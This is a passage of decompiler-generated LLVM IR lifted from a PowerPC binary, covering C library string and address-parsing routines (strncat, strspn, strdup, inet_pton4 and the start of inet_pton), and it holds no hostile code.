  %v0_10014728 = phi i32 [ %v0_100146ec9, %dec_label_pc_100146d4 ], [ %v1_100146f0, %dec_label_pc_100146ec ], [ %v1_100146f0, %dec_label_pc_10014758 ]
  %v1_100146ec = inttoptr i32 %v0_10014728 to i32*
  %v2_100146ec = load i32, i32* %v1_100146ec, align 4
  %v1_100146f0 = add i32 %v0_10014728, 4
  %v1_100146f4 = add i32 %v0_10014728, 2
  %v2_100146f8 = xor i32 %v2_100146ec, %v2_100146e8
  %v1_10014700 = add i32 %v2_100146f8, 2130640639
  %v2_10014704 = xor i32 %v1_10014700, %v2_100146f8
  %v1_10014708 = add i32 %v0_10014728, 1
  %v2_1001470c = and i32 %v2_10014704, -2130640640
  %v6_1001470c = icmp eq i32 %v2_1001470c, -2130640640
  br i1 %v6_1001470c, label %dec_label_pc_100146ec, label %dec_label_pc_10014718

dec_label_pc_10014718:                            ; preds = %dec_label_pc_100146ec
  %v2_10014718 = inttoptr i32 %v0_10014728 to i8*
  %v3_10014718 = load i8, i8* %v2_10014718, align 1
  %v4_10014718 = zext i8 %v3_10014718 to i32
  %v1_1001471c = add i32 %v0_10014728, 3
  %v4_10014720 = icmp eq i32 %v4_10014718, %v0_100146d4
  br i1 %v4_10014720, label %dec_label_pc_10014728, label %dec_label_pc_10014730

dec_label_pc_10014728:                            ; preds = %dec_label_pc_10014718
  ret i32 %v0_10014728

dec_label_pc_10014730:                            ; preds = %dec_label_pc_10014718
  %v2_10014730 = inttoptr i32 %v1_10014708 to i8*
  %v3_10014730 = load i8, i8* %v2_10014730, align 1
  %v4_10014730 = zext i8 %v3_10014730 to i32
  %v4_10014734 = icmp eq i32 %v4_10014730, %v0_100146d4
  br i1 %v4_10014734, label %dec_label_pc_1001473c, label %dec_label_pc_10014744

dec_label_pc_1001473c:                            ; preds = %dec_label_pc_10014730
  ret i32 %v1_10014708

dec_label_pc_10014744:                            ; preds = %dec_label_pc_10014730
  %v2_10014744 = inttoptr i32 %v1_100146f4 to i8*
  %v3_10014744 = load i8, i8* %v2_10014744, align 1
  %v4_10014744 = zext i8 %v3_10014744 to i32
  %v4_10014748 = icmp eq i32 %v4_10014744, %v0_100146d4
  br i1 %v4_10014748, label %dec_label_pc_10014750, label %dec_label_pc_10014758

dec_label_pc_10014750:                            ; preds = %dec_label_pc_10014744
  ret i32 %v1_100146f4

dec_label_pc_10014758:                            ; preds = %dec_label_pc_10014744
  %v2_10014758 = inttoptr i32 %v1_1001471c to i8*
  %v3_10014758 = load i8, i8* %v2_10014758, align 1
  %v4_10014758 = zext i8 %v3_10014758 to i32
  %v4_1001475c = icmp eq i32 %v4_10014758, %v0_100146d4
  br i1 %v4_1001475c, label %dec_label_pc_10014764, label %dec_label_pc_100146ec

dec_label_pc_10014764:                            ; preds = %dec_label_pc_10014758
  ret i32 %v1_1001471c

; uselistorder directives
  uselistorder i32 %v1_100146f0, { 1, 0 }
  uselistorder i32 %v0_10014728, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_100146dc, { 1, 0 }
  uselistorder i32 %v0_100146d4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100146c8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100146cc1, { 2, 1, 0 }
  uselistorder i32 %v1_100146b4, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_100146bc, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014770

dec_label_pc_10014770:                            ; preds = %dec_label_pc_10014770, %entry
  %v0_10014770 = phi i32 [ %v1_10014774, %dec_label_pc_10014770 ], [ %tmp, %entry ]
  %v1_10014770 = inttoptr i32 %v0_10014770 to i8*
  %v2_10014770 = load i8, i8* %v1_10014770, align 1
  %v1_10014774 = add i32 %v0_10014770, 1
  store i32 %v1_10014774, i32* %r11.global-to-local, align 4
  %v3_10014778 = icmp eq i8 %v2_10014770, 0
  store i1 %v3_10014778, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014778, label %dec_label_pc_10014780, label %dec_label_pc_10014770

dec_label_pc_10014780:                            ; preds = %dec_label_pc_10014770
  %v3_10014780 = icmp eq i32 %arg2, 3
  store i1 %v3_10014780, i1* %cr7_eq.global-to-local, align 1
  %v1_10014784 = add i32 %v0_10014770, -1
  store i32 %v1_10014784, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_10014820, label %dec_label_pc_10014790

dec_label_pc_10014790:                            ; preds = %dec_label_pc_10014780
  %v1_10014790 = udiv i32 %arg2, 4
  store i32 %v1_10014790, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014798

dec_label_pc_10014798:                            ; preds = %dec_label_pc_10014798.dec_label_pc_10014798_crit_edge, %dec_label_pc_10014790
  %v2_100147a8 = phi i32 [ %v0_1001479c.pre, %dec_label_pc_10014798.dec_label_pc_10014798_crit_edge ], [ %v1_10014784, %dec_label_pc_10014790 ]
  %v0_10014798 = load i32, i32* @r4, align 4
  %v1_10014798 = inttoptr i32 %v0_10014798 to i8*
  %v2_10014798 = load i8, i8* %v1_10014798, align 1
  %v1_1001479c = add i32 %v2_100147a8, 1
  store i32 %v1_1001479c, i32* %r9.global-to-local, align 4
  %v1_100147a0 = add i32 %v2_100147a8, 2
  store i32 %v1_100147a0, i32* %r7.global-to-local, align 4
  %v3_100147a4 = icmp eq i8 %v2_10014798, 0
  store i1 %v3_100147a4, i1* %cr7_eq.global-to-local, align 1
  %v4_100147a8 = inttoptr i32 %v1_1001479c to i8*
  store i8 %v2_10014798, i8* %v4_100147a8, align 1
  %v0_100147ac = load i32, i32* @r4, align 4
  %v1_100147ac = add i32 %v0_100147ac, 1
  store i32 %v1_100147ac, i32* %r11.global-to-local, align 4
  %v0_100147b0 = load i32, i32* @lr, align 4
  %v1_100147b0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147b0, i32 %v0_100147b0)
  %v0_100147b4 = load i32, i32* @r4, align 4
  %v1_100147b4 = add i32 %v0_100147b4, 1
  %v2_100147b4 = inttoptr i32 %v1_100147b4 to i8*
  %v3_100147b4 = load i8, i8* %v2_100147b4, align 1
  %v0_100147b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100147b8 = add i32 %v0_100147b8, 1
  store i32 %v1_100147b8, i32* %r8.global-to-local, align 4
  %v0_100147bc = load i32, i32* %r7.global-to-local, align 4
  %v1_100147bc = add i32 %v0_100147bc, 1
  store i32 %v1_100147bc, i32* %r10.global-to-local, align 4
  %v3_100147c0 = icmp eq i8 %v3_100147b4, 0
  store i1 %v3_100147c0, i1* %cr7_eq.global-to-local, align 1
  %v2_100147c4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100147c4 = add i32 %v2_100147c4, 1
  %v4_100147c4 = inttoptr i32 %v3_100147c4 to i8*
  store i8 %v3_100147b4, i8* %v4_100147c4, align 1
  %v0_100147c8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100147c8 = add i32 %v0_100147c8, 1
  store i32 %v1_100147c8, i32* %r9.global-to-local, align 4
  %v1_100147cc = add i32 %v0_100147c8, 2
  store i32 %v1_100147cc, i32* @r4, align 4
  %v0_100147d0 = load i32, i32* @lr, align 4
  %v1_100147d0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147d0, i32 %v0_100147d0)
  %v0_100147d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100147d4 = add i32 %v0_100147d4, 1
  %v2_100147d4 = inttoptr i32 %v1_100147d4 to i8*
  %v3_100147d4 = load i8, i8* %v2_100147d4, align 1
  %v0_100147d8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100147d8 = add i32 %v0_100147d8, 1
  store i32 %v1_100147d8, i32* %r11.global-to-local, align 4
  %v3_100147dc = icmp eq i8 %v3_100147d4, 0
  store i1 %v3_100147dc, i1* %cr7_eq.global-to-local, align 1
  %v2_100147e0 = load i32, i32* %r7.global-to-local, align 4
  %v3_100147e0 = add i32 %v2_100147e0, 1
  %v4_100147e0 = inttoptr i32 %v3_100147e0 to i8*
  store i8 %v3_100147d4, i8* %v4_100147e0, align 1
  %v0_100147e4 = load i32, i32* @lr, align 4
  %v1_100147e4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147e4, i32 %v0_100147e4)
  %v0_100147e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_100147e8 = add i32 %v0_100147e8, 1
  %v2_100147e8 = inttoptr i32 %v1_100147e8 to i8*
  %v3_100147e8 = load i8, i8* %v2_100147e8, align 1
  %v4_100147e8 = zext i8 %v3_100147e8 to i32
  store i32 %v4_100147e8, i32* %r9.global-to-local, align 4
  %v3_100147ec = icmp eq i8 %v3_100147e8, 0
  store i1 %v3_100147ec, i1* %cr7_eq.global-to-local, align 1
  %v2_100147f0 = load i32, i32* %r10.global-to-local, align 4
  %v3_100147f0 = add i32 %v2_100147f0, 1
  %v4_100147f0 = inttoptr i32 %v3_100147f0 to i8*
  store i8 %v3_100147e8, i8* %v4_100147f0, align 1
  %v0_100147f4 = load i32, i32* @lr, align 4
  %v1_100147f4 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100147f4, i32 %v0_100147f4)
  %v0_100147f8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100147f8 = add i32 %v0_100147f8, -1
  store i32 %v1_100147f8, i32* %ctr.global-to-local, align 4
  %v2_100147f8 = icmp eq i32 %v1_100147f8, 0
  br i1 %v2_100147f8, label %dec_label_pc_100147fc, label %dec_label_pc_10014798.dec_label_pc_10014798_crit_edge

dec_label_pc_10014798.dec_label_pc_10014798_crit_edge: ; preds = %dec_label_pc_10014798
  %v0_1001479c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014798

dec_label_pc_100147fc:                            ; preds = %dec_label_pc_10014798
  %v0_100147fc = load i32, i32* %r5.global-to-local, align 4
  %v1_100147fc = urem i32 %v0_100147fc, 4
  store i32 %v1_100147fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10014820

dec_label_pc_10014804:                            ; preds = %dec_label_pc_10014820, %dec_label_pc_10014804.dec_label_pc_10014804_crit_edge
  %v0_10014808 = phi i32 [ %v0_10014808.pre, %dec_label_pc_10014804.dec_label_pc_10014804_crit_edge ], [ %v0_10014820, %dec_label_pc_10014820 ]
  %v0_10014804 = load i32, i32* @r4, align 4
  %v1_10014804 = inttoptr i32 %v0_10014804 to i8*
  %v2_10014804 = load i8, i8* %v1_10014804, align 1
  %v3_10014804 = zext i8 %v2_10014804 to i32
  store i32 %v3_10014804, i32* %r9.global-to-local, align 4
  %v1_10014808 = add i32 %v0_10014808, -1
  store i32 %v1_10014808, i32* %r5.global-to-local, align 4
  %v1_1001480c = add i32 %v0_10014804, 1
  store i32 %v1_1001480c, i32* @r4, align 4
  %v3_10014810 = icmp eq i8 %v2_10014804, 0
  store i1 %v3_10014810, i1* %cr7_eq.global-to-local, align 1
  %v2_10014814 = load i32, i32* %r11.global-to-local, align 4
  %v3_10014814 = add i32 %v2_10014814, 1
  %v4_10014814 = inttoptr i32 %v3_10014814 to i8*
  store i8 %v2_10014804, i8* %v4_10014814, align 1
  store i32 %v3_10014814, i32* %r11.global-to-local, align 4
  %v0_10014818 = load i32, i32* @lr, align 4
  %v1_10014818 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10014818, i32 %v0_10014818)
  %v0_10014828 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014828 = add i32 %v0_10014828, -1
  store i32 %v1_10014828, i32* %ctr.global-to-local, align 4
  %v2_10014828 = icmp eq i32 %v1_10014828, 0
  br i1 %v2_10014828, label %dec_label_pc_1001482c, label %dec_label_pc_10014804.dec_label_pc_10014804_crit_edge

dec_label_pc_10014804.dec_label_pc_10014804_crit_edge: ; preds = %dec_label_pc_10014804
  %v0_10014808.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10014804

dec_label_pc_10014820:                            ; preds = %dec_label_pc_10014780, %dec_label_pc_100147fc
  %v0_10014820 = phi i32 [ %arg2, %dec_label_pc_10014780 ], [ %v1_100147fc, %dec_label_pc_100147fc ]
  store i32 %v0_10014820, i32* %ctr.global-to-local, align 4
  %v2_100148283 = icmp eq i32 %v0_10014820, 0
  br i1 %v2_100148283, label %dec_label_pc_1001482c, label %dec_label_pc_10014804

dec_label_pc_1001482c:                            ; preds = %dec_label_pc_10014804, %dec_label_pc_10014820
  %v0_1001482c = load i32, i32* %r9.global-to-local, align 4
  %v3_1001482c = icmp eq i32 %v0_1001482c, 0
  store i1 %v3_1001482c, i1* %cr7_eq.global-to-local, align 1
  %v0_10014830 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001482c, i32 %v0_10014830)
  %v0_10014834 = load i32, i32* %r5.global-to-local, align 4
  %v1_10014834 = trunc i32 %v0_10014834 to i8
  %v2_10014834 = load i32, i32* %r11.global-to-local, align 4
  %v3_10014834 = add i32 %v2_10014834, 1
  %v4_10014834 = inttoptr i32 %v3_10014834 to i8*
  store i8 %v1_10014834, i8* %v4_10014834, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_10014820, { 1, 2, 0 }
  uselistorder i32 %v1_10014828, { 1, 0 }
  uselistorder i32 %v1_100147fc, { 1, 0 }
  uselistorder i32 %v1_100147f8, { 1, 0 }
  uselistorder i32 %v2_100147a8, { 1, 0 }
  uselistorder i32 %v1_10014774, { 1, 0 }
  uselistorder i32 %v0_10014770, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1001482c, { 1, 0 }
  uselistorder label %dec_label_pc_10014820, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001486c1 = load i32, i32* @r3, align 4
  %v1_1001486c2 = inttoptr i32 %v0_1001486c1 to i8*
  %v2_1001486c3 = load i8, i8* %v1_1001486c2, align 1
  %v3_100148706 = icmp eq i8 %v2_1001486c3, 0
  br i1 %v3_100148706, label %dec_label_pc_10014880, label %dec_label_pc_10014878

dec_label_pc_10014848:                            ; preds = %dec_label_pc_10014848, %dec_label_pc_10014878
  %v0_10014848 = phi i32 [ %v1_1001484c, %dec_label_pc_10014848 ], [ %tmp, %dec_label_pc_10014878 ]
  %v1_10014848 = inttoptr i32 %v0_10014848 to i8*
  %v2_10014848 = load i8, i8* %v1_10014848, align 1
  %v1_1001484c = add i32 %v0_10014848, 1
  %v3_10014850 = icmp eq i8 %v2_10014848, 0
  %v4_10014854 = icmp eq i8 %v0_100148548.in, %v2_10014848
  %brmerge = or i1 %v3_10014850, %v4_10014854
  br i1 %brmerge, label %dec_label_pc_1001485c, label %dec_label_pc_10014848

dec_label_pc_1001485c:                            ; preds = %dec_label_pc_10014848
  br i1 %v3_10014850, label %dec_label_pc_10014880, label %dec_label_pc_10014864

dec_label_pc_10014864:                            ; preds = %dec_label_pc_1001485c
  %v1_10014864 = add i32 %v0_10014864, 1
  %v1_10014868 = add i32 %v0_10014868, 1
  %v1_1001486c = inttoptr i32 %v1_10014868 to i8*
  %v2_1001486c = load i8, i8* %v1_1001486c, align 1
  %v3_10014870 = icmp eq i8 %v2_1001486c, 0
  br i1 %v3_10014870, label %dec_label_pc_10014880, label %dec_label_pc_10014878

dec_label_pc_10014878:                            ; preds = %entry, %dec_label_pc_10014864
  %v0_10014868 = phi i32 [ %v1_10014868, %dec_label_pc_10014864 ], [ %v0_1001486c1, %entry ]
  %v0_10014864 = phi i32 [ %v1_10014864, %dec_label_pc_10014864 ], [ 0, %entry ]
  %v0_100148548.in = phi i8 [ %v2_1001486c, %dec_label_pc_10014864 ], [ %v2_1001486c3, %entry ]
  br label %dec_label_pc_10014848

dec_label_pc_10014880:                            ; preds = %dec_label_pc_10014864, %dec_label_pc_1001485c, %entry
  %v0_10014880 = phi i32 [ 0, %entry ], [ %v1_10014864, %dec_label_pc_10014864 ], [ %v0_10014864, %dec_label_pc_1001485c ]
  ret i32 %v0_10014880

; uselistorder directives
  uselistorder i32 %v0_10014848, { 1, 0 }
  uselistorder label %dec_label_pc_10014878, { 1, 0 }
  uselistorder label %dec_label_pc_10014848, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1001489c = call i32 @__GI_strlen()
  %v1_100148a0 = add i32 %v0_1001489c, 1
  store i32 %v1_100148a0, i32* @r29, align 4
  store i32 268519596, i32* @lr, align 4
  %v1_100148a8 = call i32 @malloc(i32 %v1_100148a0)
  store i32 %v1_100148a8, i32* @r3, align 4
  %v0_100148ac = load i32, i32* @r28, align 4
  store i32 %v0_100148ac, i32* @r4, align 4
  store i32 %v1_100148a8, i32* @r31, align 4
  %v3_100148b0 = icmp eq i32 %v1_100148a8, 0
  %v0_100148b4 = load i32, i32* @r29, align 4
  store i32 %v0_100148b4, i32* @r5, align 4
  br i1 %v3_100148b0, label %dec_label_pc_100148c0, label %dec_label_pc_100148bc

dec_label_pc_100148bc:                            ; preds = %entry
  store i32 268519616, i32* @lr, align 4
  %v0_100148bc = call i32 @memcpy()
  %v0_100148c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100148c0

dec_label_pc_100148c0:                            ; preds = %entry, %dec_label_pc_100148bc
  %v0_100148c4 = phi i32 [ 0, %entry ], [ %v0_100148c4.pre, %dec_label_pc_100148bc ]
  ret i32 %v0_100148c4

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 3, 2 }
  uselistorder label %dec_label_pc_100148c0, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100148d8 = load i32, i32* @lr, align 4
  store i32 %v0_100148d8, i32* %r0.global-to-local, align 4
  %v0_100148e0 = call i32 @__asm_mfcr()
  store i32 %v0_100148e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_100148ec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100148ec, i32* %r7.global-to-local, align 4
  %v0_100148f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10014958

dec_label_pc_10014908:                            ; preds = %dec_label_pc_10014958
  %v3_10014908 = icmp eq i32 %v0_1001497c, 4
  store i1 %v3_10014908, i1* %cr7_eq.global-to-local, align 1
  %v0_1001490c = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1001490c, label %dec_label_pc_10014944, label %dec_label_pc_10014910

dec_label_pc_10014910:                            ; preds = %dec_label_pc_10014908
  %v0_10014910 = load i32, i32* %r7.global-to-local, align 4
  %v1_10014910 = inttoptr i32 %v0_10014910 to i8*
  %v2_10014910 = load i8, i8* %v1_10014910, align 1
  %v3_10014910 = zext i8 %v2_10014910 to i32
  %v1_10014914 = mul nuw nsw i32 %v3_10014910, 10
  %v1_10014918 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014918 = add i32 %v1_10014914, %v1_10014918
  %v1_1001491c = add i32 %v2_10014918, -48
  store i32 %v1_1001491c, i32* %r0.global-to-local, align 4
  %v2_10014920 = icmp ugt i32 %v1_1001491c, 255
  %v3_10014920 = icmp eq i32 %v1_1001491c, 255
  store i1 %v3_10014920, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014920, label %dec_label_pc_100149a0, label %dec_label_pc_10014928

dec_label_pc_10014928:                            ; preds = %dec_label_pc_10014910
  %v1_10014928 = trunc i32 %v1_1001491c to i8
  store i8 %v1_10014928, i8* %v1_10014910, align 1
  %v0_1001492c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1001492c, label %dec_label_pc_10014930, label %dec_label_pc_10014958.backedge

dec_label_pc_10014930:                            ; preds = %dec_label_pc_10014928
  %v0_10014930 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014930 = add i32 %v0_10014930, 1
  store i32 %v1_10014930, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_10014938 = icmp sgt i32 %v1_10014930, 4
  %v3_10014938 = icmp eq i32 %v1_10014930, 4
  store i1 %v3_10014938, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014938, label %dec_label_pc_100149a0, label %dec_label_pc_10014958.backedge

dec_label_pc_10014944:                            ; preds = %dec_label_pc_10014908
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10014948 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_10014948.not = xor i1 %v0_10014948, true
  %v0_1001494c = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10014908, %v0_1001494c
  %or.cond = or i1 %brmerge, %v0_10014948.not
  br i1 %or.cond, label %dec_label_pc_100149a0, label %dec_label_pc_10014954

dec_label_pc_10014954:                            ; preds = %dec_label_pc_10014944
  %v0_10014954 = load i32, i32* %r6.global-to-local, align 4
  %v1_10014954 = trunc i32 %v0_10014954 to i8
  %v2_10014954 = load i32, i32* %r7.global-to-local, align 4
  %v3_10014954 = add i32 %v2_10014954, 1
  %v4_10014954 = inttoptr i32 %v3_10014954 to i8*
  store i8 %v1_10014954, i8* %v4_10014954, align 1
  store i32 %v3_10014954, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10014958.backedge

dec_label_pc_10014958.backedge:                   ; preds = %dec_label_pc_10014954, %dec_label_pc_10014928, %dec_label_pc_10014930
  %v0_10014958.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1001495c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10014958

dec_label_pc_10014958:                            ; preds = %dec_label_pc_10014958.backedge, %entry
  %v0_1001495c = phi i32 [ %v0_1001495c.pre, %dec_label_pc_10014958.backedge ], [ 0, %entry ]
  %v0_10014960 = phi i32 [ %v0_10014958.pre, %dec_label_pc_10014958.backedge ], [ %v0_100148e0, %entry ]
  %v1_10014958 = inttoptr i32 %v0_10014960 to i8*
  %v2_10014958 = load i8, i8* %v1_10014958, align 1
  %v3_10014958 = zext i8 %v2_10014958 to i32
  store i32 %v3_10014958, i32* %r11.global-to-local, align 4
  %v3_1001495c = icmp eq i32 %v0_1001495c, 0
  store i1 %v3_1001495c, i1* %cr4_eq.global-to-local, align 1
  %v1_10014960 = add i32 %v0_10014960, 1
  store i32 %v1_10014960, i32* %r3.global-to-local, align 4
  %v3_10014964 = icmp eq i8 %v2_10014958, 0
  store i1 %v3_10014964, i1* %cr7_eq.global-to-local, align 1
  %v1_10014968 = add nsw i32 %v3_10014958, -48
  store i32 %v1_10014968, i32* %r0.global-to-local, align 4
  %v2_1001496c = icmp ugt i32 %v1_10014968, 9
  store i1 %v2_1001496c, i1* %cr6_gt.global-to-local, align 1
  %v3_10014970 = icmp eq i8 %v2_10014958, 46
  store i1 %v3_10014970, i1* %cr1_eq.global-to-local, align 1
  %v0_10014974 = load i4, i4* @cr4, align 1
  %v1_10014974 = call %2 @__asm_mcrf_cr0_write(i4 %v0_10014974)
  %v4_10014974 = extractvalue %2 %v1_10014974, 2
  store i1 %v4_10014974, i1* %cr0_eq.global-to-local, align 1
  %v0_10014978 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1001497c = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10014978, label %dec_label_pc_1001497c, label %dec_label_pc_10014908

dec_label_pc_1001497c:                            ; preds = %dec_label_pc_10014958
  %v3_1001497c = icmp eq i32 %v0_1001497c, 3
  store i1 %v3_1001497c, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1001497c, 4
  br i1 %tmp9, label %dec_label_pc_100149a0, label %dec_label_pc_10014984

dec_label_pc_10014984:                            ; preds = %dec_label_pc_1001497c
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_100148ec, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014994.1168 to i32), i32* @lr, align 4
  %v0_10014990 = call i32 @memcpy()
  br label %dec_label_pc_100149a0

dec_label_pc_100149a0:                            ; preds = %dec_label_pc_10014944, %dec_label_pc_10014910, %dec_label_pc_10014930, %dec_label_pc_1001497c, %dec_label_pc_10014984
  %storemerge = phi i32 [ 1, %dec_label_pc_10014984 ], [ 0, %dec_label_pc_1001497c ], [ 0, %dec_label_pc_10014930 ], [ 0, %dec_label_pc_10014910 ], [ 0, %dec_label_pc_10014944 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_100148f0, i32* %r0.global-to-local, align 4
  %v1_100149b0 = call %1 @__asm_mtcrf(i32 8, i32 %v0_100148e0)
  %v4_100149b0 = extractvalue %1 %v1_100149b0, 2
  store i1 %v4_100149b0, i1* %cr0_eq.global-to-local, align 1
  %v9_100149b0 = extractvalue %1 %v1_100149b0, 7
  store i4 %v9_100149b0, i4* @cr4, align 1
  %v0_100149b4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100149b4

; uselistorder directives
  uselistorder i32 %v1_10014930, { 1, 0, 2 }
  uselistorder i32 %v1_1001491c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_100148e0, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_100149a0, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10014958.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_100149b8 = icmp eq i32 %arg1, 2
  %v0_100149bc = load i32, i32* @lr, align 4
  store i32 %v0_100149bc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_100149b8, label %dec_label_pc_100149e4, label %dec_label_pc_100149d8

dec_label_pc_100149d8:                            ; preds = %entry
  %v3_100149d8 = icmp eq i32 %arg1, 10
  br i1 %v3_100149d8, label %dec_label_pc_100149f8, label %dec_label_pc_10014b94

dec_label_pc_100149e4:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268519920, i32* @lr, align 4
  %v3_100149ec = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_100149ec, i32* %r3.global-to-local, align 4
  store i32 %v3_100149ec, i32* %r9.global-to-local, align 4
